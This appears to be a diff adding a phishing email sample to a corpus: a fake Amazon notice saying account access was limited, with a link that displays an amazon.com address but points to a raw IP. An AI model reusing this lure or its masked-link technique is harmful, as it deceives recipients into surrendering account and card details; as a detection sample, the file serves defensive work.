@@ -1,0 +1,76 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <limited-service@amazon.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 9AF74468E0
+ for <user@login.example.com>; Fri, 13 Apr 2007 07:17:50 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id A1E08131FC63
+ for <user@example.com>; Fri, 13 Apr 2007 07:17:50 -0400 (EDT)
+Received: from JOE (cpe-024-088-020-121.sc.res.rr.com [24.88.20.121])
+ by mail.example.org (Postfix) with ESMTP id EB3B56FA1C6
+ for <user@example.com>; Fri, 13 Apr 2007 07:17:48 -0400 (EDT)
+Received: from User ([212.158.206.107]) by JOE with Microsoft
+ SMTPSVC(5.0.2195.6713); Thu, 12 Apr 2007 23:04:26 -0700
+From: "Amazon.com"<limited-service@amazon.com>
+Subject: Access to your account was limited
+Date: Fri, 13 Apr 2007 03:58:21 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <JOEXyCTr9rf3yXvEbjk00000310@JOE>
+X-OriginalArrivalTime: 13 Apr 2007 06:04:26.0944 (UTC)
+ FILETIME=[97895C00:01C77D91]
+X-Antivirus: avast! (VPS 000733-0, 04/11/2007), Outbound message
+X-Antivirus-Status: Clean
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 1118
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Amazon</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<p><FONT face=Verdana>
+<IMG src="http://www.nextar.com/frontend/images/amazon-logo.jpg" width="125" height="123"></FONT></p>
+<p>Dear <strong>Amazon</strong>&reg; member, <br>
+</p>
+<p>We are contacting you to inform you that our Account Review Team identified 
+  some unusual activity in your account. In accordance with Amazon's User Agreement 
+  and to ensure that your account has not been compromised, access to your account 
+  was limited. Your account access will remain limited until this issue has been 
+  resolved. To secure your account and quickly restore full access, we may require 
+  some additional information from you for the following reason: We have been 
+  notified that a card associated with your account has been reported as lost 
+  or stolen, or that there were additional problems with your card. <br>
+  This process is mandatory, and if not completed within the nearest time your 
+  account or credit card may be subject for temporary suspension.<br>
+  To securely confirm your Amazon information please click on the link bellow: 
+</p>
+<pre> <a href="http://219.140.5.20/us.amazon/account/index.html">http://www.amazon.com/gp/subs/primeclub/account/homepage.html/ref=ya_hp_sub_1/104-4436503-7329515?ie=UTF8&amp;method=GET</a> </pre>
+<p>We encourage you to log in and perform the steps necessary to restore your 
+  account access as soon as possible. Allowing your account access to remain limited 
+  for an extended period of time may result in further limitations on the use 
+  of your account and possible account closure. </p>
+<p>For more information about how to protect your account please visit Amazon 
+  Security Center. We apologize for any incovenience this may cause, and we apriciate 
+  your assistance in helping us to maintain the integrity of the entire Amazon 
+  system. </p>
+<p>Thank you for using Amazon! <br>
+  The Amazon Team</p>
+<p>&nbsp;</p>
+<pre align="left">         <font size="2"><a href="http://www.amazon.com/gp/help/customer/display.html/103-8439996-7967816?ie=UTF8&nodeId=468496 ">Privacy Notice</a> &copy; 1995-2007, Amazon.com,    Inc. or its affiliates. </font></pre>
+</body>
+</html>
